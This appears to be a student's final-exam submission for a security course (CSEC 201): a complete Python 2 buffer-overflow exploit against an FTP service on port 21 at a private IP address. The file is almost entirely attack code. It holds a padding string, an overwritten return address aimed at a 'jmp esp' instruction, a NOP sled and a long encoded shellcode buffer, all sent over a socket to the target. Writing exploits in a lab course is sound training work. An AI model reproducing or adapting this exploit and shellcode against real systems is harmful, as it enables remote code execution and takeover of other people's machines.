#Sam Benoist
#CSEC 201 - Final

import socket

ip = "192.168.205.204"
port = 21
EIP = "\x44\xD8\x51\x75"  #addr of jmp esp
length = 251
nopsled = "\x90"*20
buf =  ""
buf += "\xda\xc2\xbe\xf4\xfa\x95\x9f\xd9\x74\x24\xf4\x58\x29"
buf += "\xc9\xb1\x56\x31\x70\x18\x83\xe8\xfc\x03\x70\xe0\x18"
buf += "\x60\x63\xe0\x5f\x8b\x9c\xf0\x3f\x05\x79\xc1\x7f\x71"
buf += "\x09\x71\xb0\xf1\x5f\x7d\x3b\x57\x74\xf6\x49\x70\x7b"
buf += "\xbf\xe4\xa6\xb2\x40\x54\x9a\xd5\xc2\xa7\xcf\x35\xfb"
buf += "\x67\x02\x37\x3c\x95\xef\x65\x95\xd1\x42\x9a\x92\xac"
buf += "\x5e\x11\xe8\x21\xe7\xc6\xb8\x40\xc6\x58\xb3\x1a\xc8"
buf += "\x5b\x10\x17\x41\x44\x75\x12\x1b\xff\x4d\xe8\x9a\x29"
buf += "\x9c\x11\x30\x14\x11\xe0\x48\x50\x95\x1b\x3f\xa8\xe6"
buf += "\xa6\x38\x6f\x95\x7c\xcc\x74\x3d\xf6\x76\x51\xbc\xdb"
buf += "\xe1\x12\xb2\x90\x66\x7c\xd6\x27\xaa\xf6\xe2\xac\x4d"
buf += "\xd9\x63\xf6\x69\xfd\x28\xac\x10\xa4\x94\x03\x2c\xb6"
buf += "\x77\xfb\x88\xbc\x95\xe8\xa0\x9e\xf1\xdd\x88\x20\x01"
buf += "\x4a\x9a\x53\x33\xd5\x30\xfc\x7f\x9e\x9e\xfb\xf6\x88"
buf += "\x20\xd3\xb0\xd9\xde\xd4\xc0\xf0\x24\x80\x90\x6a\x8c"
buf += "\xa9\x7b\x6b\x31\x7c\x11\x61\xa5\xbf\x4d\xb9\x1d\x28"
buf += "\x8f\x42\x4f\xf4\x06\xa4\x3f\x54\x48\x79\x80\x04\x28"
buf += "\x29\x68\x4f\xa7\x16\x88\x70\x62\x3f\x23\x9f\xda\x17"
buf += "\xdc\x06\x47\xe3\x7d\xc6\x52\x89\xbe\x4c\x56\x6d\x70"
buf += "\xa5\x13\x7d\x65\xd2\xdb\x7d\x76\x77\xdb\x17\x72\xd1"
buf += "\x8c\x8f\x78\x04\xfa\x0f\x82\x63\x79\x57\x7c\xf2\x4b"
buf += "\x23\x4b\x60\xf3\x5b\xb4\x64\xf3\x9b\xe2\xee\xf3\xf3"
buf += "\x52\x4b\xa0\xe6\x9c\x46\xd5\xba\x08\x69\x8f\x6f\x9a"
buf += "\x01\x2d\x49\xec\x8d\xce\xbc\x6e\xc9\x30\x42\x59\x72"
buf += "\x58\xbc\xd9\x82\x98\xd6\xd9\xd2\xf0\x2d\xf5\xdd\x30"
buf += "\xcd\xdc\xb5\x58\x44\xb1\x74\xf9\x59\x98\xd9\xa7\x5a"
buf += "\x2f\xc2\x58\x20\x40\xf5\x99\xd5\x48\x92\x9a\xd5\x74"
buf += "\xa4\xa7\x03\x4d\xd2\xe6\x97\xea\xed\x5d\xb5\x5b\x64"
buf += "\x9d\xe9\x9c\xad"

try:
	sock = socket.socket()
	sock.settimeout(3)
	sock.connect((ip, port))
	print sock.recv(1024)
	bad_string = "A"*length + EIP + nopsled + buf + "\r\n"
	sock.send(bad_string)
	print sock.recv(1024)
	sock.close()
except:
	print "Something broke"
	print length

